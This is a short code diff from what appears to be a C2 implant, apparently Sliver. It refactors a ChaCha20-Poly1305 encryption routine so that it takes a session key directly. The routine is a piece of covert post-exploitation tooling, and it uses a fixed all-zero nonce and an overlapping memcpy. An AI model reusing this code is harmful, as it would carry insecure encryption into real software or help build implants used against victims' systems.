@@ -317,24 +317,15 @@ PENVELOPE CreateErrorRespEnvelope
 
 PBUFFER SliverEncrypt
 (
-	_In_ PGLOBAL_CONFIG pConfig,
-	_In_ PBUFFER pInput,
-	_In_ BOOL SendToServer
+	_In_ PBYTE pSessionKey,
+	_In_ PBUFFER pInput
 )
 {
 	BYTE Nonce[CHACHA20_NONCE_SIZE];
 	PBUFFER pResult = NULL;
-	PBYTE pSessionKey = NULL;
 
 	SecureZeroMemory(Nonce, sizeof(Nonce));
 	pResult = ALLOC(sizeof(BUFFER));
-	if (SendToServer) {
-		pSessionKey = pConfig->pSessionKey;
-	}
-	else {
-		pSessionKey = pConfig->pPeerSessionKey;
-	}
-
 	Chacha20Poly1305Encrypt(pSessionKey, Nonce, pInput->pBuffer, pInput->cbBuffer, NULL, 0, &pResult->pBuffer, &pResult->cbBuffer);
 	pResult->pBuffer = REALLOC(pResult->pBuffer, pResult->cbBuffer + CHACHA20_NONCE_SIZE);
 	memcpy(pResult->pBuffer + CHACHA20_NONCE_SIZE, pResult->pBuffer, pResult->cbBuffer);
